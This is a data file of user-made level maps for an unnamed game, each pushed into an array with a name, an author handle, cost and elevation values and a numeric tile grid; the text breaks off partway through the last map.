maps.push({name="trust",author="stu",id="#1650759240",direction="forward",cost=550,elevation=5,map=[102,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,102,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,1,1,1,1,96,96,1,1,98,98,1,1,1,1,1,9,9,9,9,9,9,9,1,9,9,9,1,1,9,9,9,1,9,9,9,9,9,9,9,9,9,9,1,9,76,9,1,1,9,76,9,1,9,9,9,9,9,9,9,9,9,9,1,14,79,14,1,1,14,79,14,1,9,9,9,9,9,9,9,9,9,9,1,14,79,14,1,1,14,79,14,1,9,9,9,9,9,101,101,9,9,9,1,14,79,14,1,1,14,79,14,1,9,9,9,101,101,101,101,9,9,9,1,14,79,14,1,1,14,79,14,1,9,9,9,101,101,101,101,9,9,9,1,14,79,14,1,1,14,79,14,1,9,9,9,101,101,101,101,9,9,9,1,14,79,14,1,1,14,79,14,1,9,9,9,101,101,101,101,9,9,9,1,9,76,9,1,1,9,76,9,1,9,9,9,101,101,101,101,9,9,9,24,9,9,9,1,1,9,9,9,24,9,9,9,101,101,101,101,9,9,9,24,3,9,9,1,1,9,9,3,24,9,9,9,101,101,101,101,1,99,9,24,9,9,9,1,1,9,9,9,24,9,97,1,101,101,101,101,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,101,101,9,9,9,9,9,9,9,95,95,95,95,95,95,9,9,9,9,9,9,9,9,9,9,9,9,9,9,95,95,2,2,95,95,9,9,9,9,9,9,9]});
maps.push({name="Divided Holds",author="Skadoosh",id="#1650760738",direction="forward",cost=377,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,24,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,4,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,3,24,24,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,24,24,0,0,67,0,0,0,67,0,0,0,67,0,0,0,67,0,0,4,24,1,1,1,65,1,1,1,65,1,1,1,65,1,1,1,65,1,1,1,1,1,1,1,65,1,1,1,65,1,1,1,65,1,1,1,65,1,1,1,1,1,100,1,65,1,100,1,65,1,100,1,65,1,100,1,65,1,100,1,1,1,95,1,65,1,95,1,65,1,95,1,65,1,95,1,65,1,95,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,5]});
maps.push({name="IDK if this works",author="Skadoosh",id="#1650763806",direction="right",cost=553,elevation=12,map=[5,2,2,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,1,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,2,4,4,4,4,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,2,9,9,9,9,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,37,45,45,45,45,1,1,67,67,66,5,5,66,66,66,66,66,66,66,66,37,45,45,45,45,25,25,67,92,66,5,5,66,66,66,66,66,66,66,66,37,45,45,45,45,25,25,67,67,66,5,5,66,66,66,66,66,66,66,66,37,46,46,46,46,26,26,67,92,66,5,5,66,66,66,66,66,66,66,66,37,47,47,47,47,27,27,67,67,66,5,5,67,67,67,67,67,67,67,67,37,48,48,48,48,28,28,67,92,66,5,5,37,37,37,37,37,37,37,37,37,49,49,49,49,29,29,67,67,66,5,5,37,0,0,0,0,0,0,0,0,50,50,50,50,30,30,67,92,66,5,5,37,0,0,0,0,0,0,0,0,51,51,51,51,31,31,67,67,66,5,5,37,0,0,0,0,0,0,0,0,52,52,52,52,32,32,67,92,66,5,5,37,0,0,0,0,0,0,0,0,53,53,53,53,33,33,67,67,66,5,5,37,37,37,37,37,37,37,37,37,54,54,54,54,34,34,67,92,66,5,5,67,67,67,67,67,67,67,67,37,54,54,54,54,34,34,67,67,66,5,5,66,66,66,66,66,66,66,66,37,54,54,54,54,35,35,67,92,66,5,5,66,66,66,66,66,66,66,66,37,54,54,54,54,36,36,67,67,66,5,5,66,66,66,66,66,66,66,66,37,54,54,54,54,37,37,95,95,95,95,37,37,37,37,37,37,37,37,37,37]});
maps.push({name="wholettheboxout",author="iProbie",id="#1650764869",direction="forward",cost=163,elevation=0,map=[0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,90,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,90,5,90,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,90,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,90,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,5,5,90,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,90,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,90,5,90,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,90,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,5,5,90,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,90,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,5,90,90,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,90,5,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,5,90,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,90,5,90,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,90,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,90,90,5,90,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0]});
maps.push({name="Cursed Sloper",author="Skadoosh",id="#1650768362",direction="forward",cost=732,elevation=17,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,67,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,67,67,66,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,66,67,67,66,66,8,8,8,8,8,8,8,8,8,8,8,8,8,8,66,66,67,67,66,66,67,9,9,9,9,9,9,9,9,9,9,9,9,67,66,66,67,67,66,66,67,9,10,10,10,10,10,10,10,10,10,10,9,67,66,66,67,67,66,66,67,9,66,11,11,11,11,11,11,11,11,66,9,67,66,66,67,67,66,66,67,9,66,66,12,12,12,12,12,12,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,13,13,13,13,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,14,14,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,15,15,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,16,16,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,17,17,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,18,18,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,19,19,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,20,20,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,21,21,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,22,22,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,23,23,67,66,66,66,9,67,66,66,67,67,66,66,67,9,66,66,66,67,2,2,67,66,66,66,9,67,66,66,67]});
maps.push({name="Traversal",author="tormacoy",id="#1650798819",direction="forward",cost=238,elevation=10,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,77,77,24,24,24,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,77,77,77,24,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,77,77,0,0,0,67,24,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,67,24,24,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,67,67,24,24,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,12,13,14,95,15,15,15,3,44,44,1,0,0,0,7,7,0,0,0,0,12,13,14,95,15,15,15,0,44,44,100,0,0,0,7,7,0,0,0,0,12,13,0,0,15,15,15,3,44,44,1,0,0,0,8,8,9,9,10,10,12,13,0,0,0,35,35,0,0,0,0,24,77,0,8,8,9,9,10,10,10,0,0,0,33,0,33,0,0,0,0,24,77,0,9,9,1,67,67,24,10,0,0,0,32,0,0,32,0,0,0,24,77,0,9,10,1,24,67,67,4,0,0,33,32,55,55,0,0,0,0,24,77,0,11,11,12,12,13,13,14,95,34,0,32,55,55,0,0,0,0,24,77,0,11,11,12,12,13,13,14,95,34,0,32,69,69,0,0,0,0,24,77,0,0,0,0,0,0,0,0,0,0,33,0,69,69,0,0,0,0,24,77,77,77,0,0,0,0,0,0,0,0,0,0,55,55,0,0,0,0,24,24,24,77,77,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="ladders",author="chong",id="#1650801231",direction="forward",cost=458,elevation=14,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,65,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,65,1,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,24,24,24,24,24,24,24,24,65,65,24,24,24,24,24,24,24,24,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,1,14,14,14,14,13,13,13,13,13,13,13,13,13,13,14,14,14,14,1,1,14,14,14,14,13,15,15,15,15,15,15,15,15,13,14,14,14,14,1,1,14,14,14,14,13,15,17,17,17,17,17,17,15,13,14,14,14,14,1,1,14,14,14,14,13,15,17,19,19,19,19,17,15,13,14,14,14,14,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="Mountain Waterfalls",author="tormacoy",id="#1650807158",direction="right",cost=399,elevation=0,map=[24,77,0,2,2,0,24,24,24,0,0,0,0,24,24,24,24,24,24,24,24,77,0,5,5,0,77,77,77,0,0,0,0,18,18,18,18,20,20,24,24,77,0,5,5,0,0,0,0,0,0,0,0,9,9,9,18,20,20,23,24,77,0,5,5,0,0,0,0,0,5,5,5,5,5,9,13,13,20,24,24,77,0,5,5,85,5,5,5,5,5,11,11,11,5,5,5,13,17,24,24,77,5,5,0,5,5,5,5,5,5,5,5,5,16,16,5,9,17,24,24,77,5,0,0,0,0,0,11,5,23,17,0,5,5,16,8,5,9,24,0,0,5,67,67,67,67,67,67,5,23,17,0,0,5,8,8,5,85,0,0,5,5,67,24,24,24,24,67,5,23,13,13,0,0,5,9,9,5,0,0,5,0,67,24,24,24,24,67,93,5,5,5,5,5,85,9,9,5,0,0,85,5,67,24,24,24,24,67,0,0,67,67,67,67,5,5,5,5,0,0,5,5,67,24,24,24,24,67,0,67,24,24,24,24,5,5,5,5,0,0,5,94,5,67,67,67,67,67,0,67,24,24,24,24,24,5,0,5,5,0,5,5,5,5,5,0,0,0,0,67,24,24,24,24,24,5,0,0,5,0,11,5,67,24,5,5,0,23,23,67,24,24,24,24,24,5,5,0,85,23,11,5,5,67,67,5,5,85,0,0,67,67,67,67,67,0,5,0,5,23,11,0,5,5,24,67,24,5,5,5,5,0,0,0,0,0,5,5,5,23,11,11,0,85,5,24,67,24,67,24,5,5,5,0,0,0,0,85,2,18,18,11,11,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,24,24,24,11,11,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0]});
maps.push({name="Dont Shoot Baboons",author="MacBlub",id="#1650807998",direction="left",cost=256,elevation=-10,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,77,91,91,77,77,77,77,77,0,0,24,24,1,19,19,19,1,1,1,1,76,75,75,76,76,76,76,19,19,19,24,59,59,19,94,19,76,78,78,78,76,75,75,76,76,76,76,19,93,19,24,59,1,19,19,19,1,1,1,1,76,75,75,76,76,76,76,19,19,19,24,59,1,1,1,1,1,0,0,0,77,19,19,77,77,77,77,77,39,0,0,32,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,39,0,0,33,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,39,0,0,0,0,0,39,0,34,0,77,77,77,0,0,0,0,19,19,19,0,0,39,0,39,0,0,2,14,14,75,75,75,91,91,14,19,19,87,19,0,0,0,0,0,0,0,2,14,14,75,75,75,91,91,14,19,19,19,19,0,0,0,0,0,0,0,0,0,0,77,77,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Tea Break",author="lamp",id="#1650810623",direction="left",cost=51,elevation=0,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,34,34,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,2,34,34,96,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,2,34,34,96,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,97,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Press buttons 2",author="WrexGigarton",id="#1650811125",direction="forward",cost=852,elevation=0,map=[65,65,65,65,65,65,65,65,65,2,2,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,15,15,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,15,15,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,15,15,65,65,65,65,65,65,65,65,65,65,65,100,24,24,23,20,19,16,15,15,16,19,20,23,24,24,100,65,65,65,65,24,24,24,22,21,18,17,15,15,17,18,21,22,24,24,24,65,65,65,65,24,24,75,75,75,75,75,15,15,75,75,75,75,75,24,24,65,65,65,65,91,91,75,75,75,75,75,15,15,75,75,75,75,75,91,91,65,65,65,65,24,24,75,75,75,75,75,15,15,75,75,75,75,75,24,24,65,65,65,65,91,91,75,75,75,75,75,15,15,75,75,75,75,75,91,91,65,65,65,65,24,24,75,75,75,75,1,96,96,1,75,75,75,75,24,24,65,65,65,65,91,91,75,75,75,75,75,15,15,75,75,75,75,75,91,91,65,65,65,65,24,24,75,75,75,75,75,15,15,75,75,75,75,75,24,24,65,65,65,65,91,91,75,75,75,75,75,15,15,75,75,75,75,75,91,91,65,65,65,65,24,24,75,44,75,38,75,15,15,75,38,75,44,75,24,24,65,65,65,65,97,24,75,44,75,38,75,15,15,75,38,75,44,75,24,97,65,65,65,65,75,75,75,75,75,75,75,15,15,75,75,75,75,75,75,75,65,65,65,65,75,75,75,75,75,75,1,96,96,1,75,75,75,75,75,75,65,65,65,65,75,75,75,75,75,75,75,15,15,75,75,75,75,75,75,75,65,65,65,65,75,75,75,75,75,75,75,2,2,75,75,75,75,75,75,75,65,65]});
maps.push({name="Turn",author="Bucket Head",id="#1650811855",direction="forward",cost=466,elevation=4,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,9,9,9,9,9,9,1,9,9,9,9,9,9,9,1,5,5,1,1,1,9,9,9,9,9,9,1,9,9,9,9,9,9,9,1,5,5,1,1,1,9,9,1,9,9,9,1,9,9,9,1,9,9,9,1,5,5,1,1,1,9,9,1,9,9,9,1,9,9,9,1,9,9,9,1,5,5,1,1,1,9,9,1,9,9,9,1,9,9,9,1,9,9,9,1,5,5,1,1,1,9,9,1,1,95,1,1,92,75,92,1,3,5,3,1,5,5,1,1,1,9,9,1,9,9,9,1,75,75,75,1,5,5,5,1,5,5,1,1,1,9,9,1,9,9,9,1,75,75,75,1,66,66,66,1,5,5,1,1,1,9,9,1,9,9,9,1,75,75,75,1,66,66,66,1,5,5,1,1,1,9,9,1,9,9,9,1,9,9,9,1,66,66,66,1,5,5,1,1,1,9,9,1,9,9,9,1,9,9,9,1,66,66,66,1,5,5,1,1,1,91,91,1,9,9,9,1,9,9,9,1,66,66,66,1,5,5,1,1,1,91,91,1,9,9,9,1,9,9,9,1,66,66,66,1,5,5,1,1,1,91,91,1,9,9,9,1,97,9,9,1,66,66,66,1,5,5,1,1,1,91,91,1,9,9,9,1,9,9,9,1,5,5,5,1,5,5,1,1,1,9,9,1,9,9,9,1,96,96,96,1,5,5,5,1,5,5,1,1,1,9,9,1,9,9,9,9,9,9,9,1,5,5,5,5,5,5,1,1,1,9,9,1,9,9,9,9,9,9,9,1,5,5,5,5,5,5,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Delevation",author="GoGoShooter",id="#1650811964",direction="left",cost=252,elevation=-19,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,2,5,5,0,1,0,14,14,3,5,0,15,15,0,1,0,24,24,0,1,2,5,5,0,1,0,14,14,0,1,0,15,15,0,1,0,24,24,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1,1,6,6,0,1,0,13,13,0,1,0,16,16,0,1,0,23,23,0,1,1,6,6,0,1,0,13,13,0,1,0,16,16,0,1,0,23,23,0,1,1,6,6,0,1,0,13,13,0,1,0,16,16,0,1,0,23,23,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1,1,7,7,0,1,0,12,12,0,1,0,17,17,0,1,0,22,22,0,1,1,7,7,0,1,0,12,12,0,1,0,17,17,0,1,0,22,22,0,1,1,7,7,0,1,0,12,12,0,1,0,17,17,0,1,0,22,22,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1,1,8,8,0,1,0,11,11,0,1,0,18,18,0,1,0,21,21,0,1,1,8,8,0,1,0,11,11,0,1,0,18,18,0,1,0,21,21,0,1,1,8,8,0,1,0,11,11,0,1,0,18,18,0,1,0,21,21,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1,1,9,9,0,1,0,10,10,0,1,0,19,19,0,1,0,20,20,0,1,1,9,9,3,5,0,10,10,0,1,0,19,19,3,5,0,20,20,0,1,1,9,9,3,5,0,10,10,0,1,0,19,19,3,5,0,20,20,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Cascade room",author="Fantasy",id="#1650812391",direction="left",cost=452,elevation=-11,map=[14,14,14,8,8,67,0,67,24,67,0,0,0,0,0,2,2,0,0,0,2,8,98,8,8,67,0,67,24,67,0,19,19,19,19,19,19,19,19,19,2,8,98,8,90,67,0,67,24,67,0,19,0,0,0,0,0,0,0,19,14,14,14,8,8,67,0,67,24,67,0,19,0,0,0,67,0,0,0,19,8,8,8,8,8,67,0,67,24,67,0,19,0,0,67,24,67,0,0,19,8,90,8,8,90,67,0,67,24,67,0,19,0,67,24,1,24,67,0,19,8,8,8,8,90,67,0,67,24,67,0,19,0,0,67,24,67,0,0,19,93,8,90,8,8,67,0,67,24,67,0,0,0,0,0,67,0,0,0,0,8,8,8,8,8,67,0,67,24,67,0,0,0,0,0,0,0,0,0,0,8,90,8,8,90,67,0,67,24,67,0,15,0,0,0,67,0,0,0,15,8,8,8,90,8,67,0,67,24,67,0,15,0,0,67,24,67,0,0,15,8,8,8,8,8,67,0,67,24,67,0,15,0,67,24,1,24,67,0,15,8,90,8,8,8,67,0,67,24,67,0,15,0,0,67,24,67,0,0,15,8,8,8,8,8,67,0,67,24,67,0,15,0,0,0,67,0,0,0,15,8,8,8,8,8,67,0,67,24,67,0,15,0,0,0,0,0,0,0,15,8,90,8,90,8,67,0,67,24,67,0,15,15,15,15,15,15,15,15,15,8,8,8,8,8,1,1,1,1,1,1,1,1,1,1,15,15,1,1,1,8,8,8,8,8,96,8,8,8,9,10,11,12,13,14,15,15,0,35,94,24,3,8,8,8,96,8,8,8,9,10,11,12,13,14,15,15,0,35,97,99,3,8,8,90,1,67,67,67,67,67,1,1,1,1,1,1,1,1,1]});
maps.push({name="Dont fall",author="Wolfdiman",id="#1650812946",direction="forward",cost=171,elevation=19,map=[25,2,2,25,0,0,0,0,0,99,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,36,0,0,0,37,37,0,0,37,38,0,25,25,25,25,0,0,0,0,0,0,0,98,36,36,1,1,1,1,38,0,0,25,1,25,0,0,0,0,0,0,35,1,1,1,1,35,35,1,0,0,0,26,1,0,0,0,0,0,0,0,0,1,34,34,98,0,0,1,0,0,0,0,1,26,0,0,0,0,0,0,34,1,0,0,0,0,36,1,38,0,0,26,1,0,0,0,0,0,0,33,1,1,0,0,0,0,37,1,0,0,0,27,1,26,0,0,0,0,0,33,1,34,34,0,0,0,0,1,39,0,0,27,1,27,0,0,0,0,0,0,1,34,0,0,0,38,37,1,39,0,0,0,1,0,0,0,0,0,32,32,1,33,0,0,0,38,1,1,40,0,0,28,1,27,0,0,0,96,1,1,1,0,0,0,0,39,1,40,0,0,0,0,1,28,0,0,0,31,1,32,33,33,0,0,0,40,1,0,0,0,0,28,1,29,29,0,0,0,1,0,0,0,0,0,0,41,1,41,0,0,0,29,1,1,30,0,30,31,1,96,0,0,0,0,0,42,1,42,0,0,0,29,29,1,1,1,1,1,1,96,0,0,0,0,0,0,1,42,0,0,0,0,0,29,0,30,30,0,31,31,0,0,0,0,0,43,43,43,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,44,0,0,0,0,0,0,30,0,0,0,0,0,0,0,0,44,44,44,44,44,0,0,0,0,0,0,97,0,0,0,0,0,0,0,0,44,44,2,2,44]});
maps.push({name="Alien Mountain Escap",author="Fantasy",id="#1650813226",direction="forward",cost=406,elevation=17,map=[6,6,5,5,5,5,5,5,5,2,2,5,5,5,5,23,23,5,22,22,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,23,23,5,22,22,5,5,5,5,5,44,44,44,5,5,5,5,5,5,5,5,5,5,5,5,7,7,5,5,5,44,100,44,5,5,5,5,5,5,24,23,5,5,21,21,7,7,5,5,5,44,44,44,5,5,5,5,5,5,24,24,5,5,21,21,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,8,8,5,5,5,5,5,5,5,5,5,5,5,5,24,24,5,5,20,20,8,8,5,5,5,5,44,44,5,5,5,5,5,5,24,24,5,5,20,20,5,5,5,5,5,1,96,96,1,5,5,5,5,5,5,5,5,5,5,5,9,9,5,5,5,5,44,44,5,5,5,5,5,5,24,24,5,5,19,19,9,9,5,5,5,5,44,44,5,5,5,5,5,5,24,24,5,5,19,19,5,5,5,44,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,9,9,44,97,5,5,44,44,5,5,44,5,44,5,23,24,5,5,18,18,10,10,5,44,5,5,44,44,5,44,5,44,5,5,24,24,5,5,18,18,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,11,11,5,5,5,5,5,5,5,5,5,5,5,5,24,24,5,5,17,17,10,10,5,5,5,5,5,5,5,5,5,5,5,5,24,24,17,5,17,17,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,12,12,5,13,13,5,14,14,5,15,15,5,16,16,5,17,5,22,22,5,12,12,5,13,13,5,14,14,5,15,15,5,16,16,5,17,22,2,2,22]});
maps.push({name="iknowyouwantit",author="iProbie",id="#1650813907",direction="left",cost=170,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,98,98,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,98,93,2,5,5,5,5,5,5,5,5,97,5,5,5,5,5,5,5,5,98,94,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,98,98,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,99,5,96,0,0,0,0,0,0,0,0]});
maps.push({name="Just Jump",author="MacBlub",id="#1650814680",direction="left",cost=146,elevation=-19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,58,58,58,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,58,97,58,24,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,24,58,58,58,24,0,0,0,0,0,0,0,0,0,24,93,24,0,44,0,24,24,24,58,24,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,24,58,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,58,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,58,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0